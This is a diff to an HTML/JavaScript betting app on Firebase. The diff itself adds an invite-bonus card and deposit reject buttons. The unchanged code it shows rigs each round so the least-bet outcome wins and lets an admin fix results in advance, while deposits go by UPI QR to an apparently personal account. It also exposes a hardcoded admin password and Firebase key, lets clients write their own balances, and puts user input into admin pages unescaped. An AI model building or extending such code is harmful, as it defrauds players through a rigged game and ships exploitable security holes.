@@ -21,6 +21,9 @@
         .n-btn { border: 2px solid #ddd; background: #fff; padding: 10px; border-radius: 50%; font-weight: bold; cursor: pointer; font-size: 16px; }
         .bs-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
         
+        /* Invite Section Style */
+        .invite-card { background: var(--gold); padding: 15px; border-radius: 15px; margin: 15px; text-align: center; font-weight: 800; cursor: pointer; color: #000; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+
         /* Premium Stylish Popup */
         .win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; }
         .win-card { background: linear-gradient(180deg, #ff4757, #ff6b81); width: 85%; max-width: 350px; border-radius: 30px; padding: 30px 15px; text-align: center; color: white; position: relative; animation: pop 0.4s ease; }
@@ -34,8 +37,8 @@
         .modal-content { background: #fff; padding: 20px; border-radius: 15px; width: 95%; max-height: 85vh; overflow-y: auto; text-align: center; }
         table { width: 100%; font-size: 11px; border-collapse: collapse; margin-top: 10px; }
         th, td { border-bottom: 1px solid #eee; padding: 10px 5px; text-align: center; }
-        .approve-btn { background: var(--green); color: white; border: none; padding: 5px 10px; border-radius: 4px; }
-        .reject-btn { background: var(--red); color: white; border: none; padding: 5px 10px; border-radius: 4px; }
+        .approve-btn { background: var(--green); color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
+        .reject-btn { background: var(--red); color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -66,6 +69,10 @@
         <button class="btn" style="background:#ffa502" onclick="betPopup('Big')">Big</button>
         <button class="btn" style="background:#2f3542" onclick="betPopup('Small')">Small</button>
     </div>
+</div>
+
+<div class="invite-card" onclick="copyInvite()">
+    🎁 INVITE FRIENDS (GET 10% BONUS)
 </div>
 
 <div class="game-area">
@@ -125,11 +132,10 @@
     <h3>Withdrawal</h3>
     <input type="number" id="wAmt" placeholder="Min ₹200">
     <input type="text" id="wUpi" placeholder="UPI ID">
-    <button onclick="sendWit()" style="width:100%; background:var(--primary); border:none; padding:12px; color:#fff; border-radius:8px;">Submit</button>
+    <button onclick="sendWit()" style="width:100%; background:var(--primary); border:none; padding:12px; color:#fff; font-weight:bold; border-radius:8px;">Submit</button>
 </div></div>
 
 <script>
-    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyCrt3NnWu9vOeXHyirYEAjOitPXBswLFwU",
       authDomain: "my-colour-game-670af.firebaseapp.com",
@@ -141,23 +147,23 @@
 
     let uid = localStorage.getItem('1CLUB_UID_FINAL') || "U"+Math.floor(1000+Math.random()*9000);
     localStorage.setItem('1CLUB_UID_FINAL', uid);
-    let bal = 0, lastP = 0, sessionStart = Date.now();
+    let bal = 0, lastP = 0;
+    
+    // 2. REFRESH FIX: Anti-Ghost Winning Logic
+    let sessionStart = Date.now(); 
 
-    // Sync Balance
     db.ref('users/'+uid).on('value', s => {
         let d = s.val() || {balance:0}; bal = d.balance;
         document.getElementById('uBal').innerText = bal.toFixed(2);
         document.getElementById('uID').innerText = "ID: "+uid;
     });
 
-    // Generate Number Grid
     for(let i=0; i<=9; i++) {
         let col = (i % 2 == 0) ? 'var(--red)' : 'var(--green)';
         if(i == 0 || i == 5) col = 'var(--violet)';
         document.getElementById('nums').innerHTML += `<button class="n-btn" onclick="betPopup('${i}')" style="color:${col}; border-color:${col};">${i}</button>`;
     }
 
-    // Timer Sync
     setInterval(() => {
         let now = Date.now(), s = 60 - Math.floor((now / 1000) % 60), p = Math.floor(now / 60000);
         document.getElementById('timer').innerText = "00:" + (s < 10 ? "0"+s : s);
@@ -165,7 +171,6 @@
         if(s === 1 && lastP !== p) { lastP = p; processGame(p); }
     }, 1000);
 
-    // Smart Game Logic: Lowest Pool Wins
     function processGame(p) {
         db.ref('global_res/'+p).transaction(curr => {
             if(curr === null) {
@@ -173,12 +178,9 @@
                     db.ref('bets/'+p).once('value', b => {
                         let pool = { Green:0, Red:0, Violet:0, Big:0, Small:0, "0":0,"1":0,"2":0,"3":0,"4":0,"5":0,"6":0,"7":0,"8":0,"9":0 };
                         b.forEach(u => u.forEach(x => pool[x.val().type] += parseFloat(x.val().amt)));
-                        
                         let win = m.val() || Object.keys(pool).reduce((a,b) => pool[a] <= pool[b] ? a : b);
-                        
                         let nums = (win=='Green')?[1,3,7,9] : (win=='Red')?[2,4,6,8] : (win=='Big')?[5,6,7,8,9] : (win=='Small')?[0,1,2,3,4] : [0,5];
                         let winNum = nums[Math.floor(Math.random()*nums.length)];
-                        
                         db.ref('global_res/'+p).set({ win: win, num: winNum, time: Date.now() });
                         db.ref('admin/manual').set(null);
                     });
@@ -187,10 +189,10 @@
         });
     }
 
-    // Result Listener & Stylish Popup
     db.ref('global_res').on('child_added', snap => {
         let p = snap.key, res = snap.val();
-        if(res.time < sessionStart) return;
+        // REFRESH CHECK: Only process results after session start
+        if(!res.time || res.time < sessionStart) return;
 
         db.ref('bets/'+p+'/'+uid).once('value', s => {
             let totalWin = 0; let size = res.num>=5?'Big':'Small';
@@ -216,7 +218,6 @@
         setTimeout(closeStatus, 4000);
     }
 
-    // History Sorting (Latest on Top)
     db.ref('global_res').limitToLast(15).on('value', s => {
         let h = "<tr><th>Period</th><th>Num</th><th>Size</th><th>Color</th></tr>";
         let arr = []; s.forEach(x => { arr.push({p:x.key, ...x.val()}); });
@@ -227,16 +228,26 @@
         document.getElementById('resTable').innerHTML = h;
     });
 
-    // Admin Panel Logic
     function checkAdmin() { let p = prompt("Admin Pass:"); if(p=="77759636477") { openM('adminM'); loadAdminData(); } }
+    
     function loadAdminData() {
         db.ref('requests').on('value', s => {
             let dep = "<table><tr><th>ID</th><th>Amt</th><th>UTR</th><th>Action</th></tr>";
             let wit = "<table><tr><th>ID</th><th>Amt</th><th>UPI</th><th>Action</th></tr>";
             s.forEach(r => {
                 let d = r.val();
-                if(d.type=='Dep') dep += `<tr><td>${d.uid}</td><td>${d.amt}</td><td>${d.utr}</td><td><button class="approve-btn" onclick="appr('${r.key}','${d.uid}',${d.amt})">✔</button></td></tr>`;
-                else wit += `<tr><td>${d.uid}</td><td>${d.amt}</td><td>${d.upi}</td><td><button class="reject-btn" onclick="remReq('${r.key}')">❌</button></td></tr>`;
+                if(d.type=='Dep') {
+                    // DEPOSIT WITH REJECT OPTION
+                    dep += `<tr><td>${d.uid}</td><td>${d.amt}</td><td>${d.utr}</td><td>
+                        <button class="approve-btn" onclick="appr('${r.key}','${d.uid}',${d.amt})">✔</button>
+                        <button class="reject-btn" onclick="remReq('${r.key}')">✖</button>
+                    </td></tr>`;
+                } else {
+                    wit += `<tr><td>${d.uid}</td><td>${d.amt}</td><td>${d.upi}</td><td>
+                        <button class="approve-btn" onclick="remReq('${r.key}')">✔ Done</button>
+                        <button class="reject-btn" onclick="remReq('${r.key}')">✖</button>
+                    </td></tr>`;
+                }
             });
             document.getElementById('depList').innerHTML = dep + "</table>";
             document.getElementById('witList').innerHTML = wit + "</table>";
@@ -245,9 +256,8 @@
     
     function appr(k, u, a) { db.ref('users/'+u+'/balance').transaction(c=>(c||0)+a); remReq(k); }
     function remReq(k) { db.ref('requests/'+k).remove(); }
-    function fixRes(v) { db.ref('admin/manual').set(v); alert("Next Result: "+v); }
+    function fixRes(v) { db.ref('admin/manual').set(v); alert("Fixed Next: "+v); }
 
-    // UI Helper Functions
     function betPopup(t) { selType = t; document.getElementById('betTitle').innerText = "Bet: "+t; openM('betM'); }
     function confirmBet() {
         let a = parseInt(document.getElementById('betAmt').value), p = document.getElementById('period').innerText;
@@ -255,15 +265,16 @@
             db.ref('users/'+uid).update({balance: bal - a});
             db.ref('bets/'+p+'/'+uid).push({type: selType, amt: a});
             closeM('betM');
-        } else alert("Insufficient Balance!");
+        } else alert("Low Balance!");
     }
-    function sendDep() { db.ref('requests').push({uid, amt: parseInt(document.getElementById('dAmt').value), utr: document.getElementById('dUTR').value, type:'Dep'}); closeM('depM'); alert("Submitted!"); }
-    function sendWit() { let a = parseInt(document.getElementById('wAmt').value); if(bal>=a && a>=200){ db.ref('users/'+uid).update({balance: bal-a}); db.ref('requests').push({uid, amt: a, upi: document.getElementById('wUpi').value, type:'Wit'}); closeM('witM'); alert("Request Sent!"); } }
+
+    function copyInvite() { navigator.clipboard.writeText(window.location.href + "?ref=" + uid); alert("Link Copied!"); }
     function genQR() { let a = document.getElementById('dAmt').value; if(a>=100){ document.getElementById('qrImg').src=`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=poonamlondhe52-1@okhdfcbank%26am=${a}`; document.getElementById('qrDisp').style.display='block'; } }
+    function sendDep() { db.ref('requests').push({uid, amt: parseInt(document.getElementById('dAmt').value), utr: document.getElementById('dUTR').value, type:'Dep'}); closeM('depM'); alert("Sent!"); }
+    function sendWit() { let a = parseInt(document.getElementById('wAmt').value); if(bal>=a && a>=200){ db.ref('users/'+uid).update({balance: bal-a}); db.ref('requests').push({uid, amt: a, upi: document.getElementById('wUpi').value, type:'Wit'}); closeM('witM'); alert("Sent!"); } }
     function openM(id) { document.getElementById(id).style.display = 'flex'; }
     function closeM(id) { document.getElementById(id).style.display = 'none'; }
     function closeStatus() { document.getElementById('statusPopup').style.display = 'none'; }
 </script>
 </body>
 </html>
-
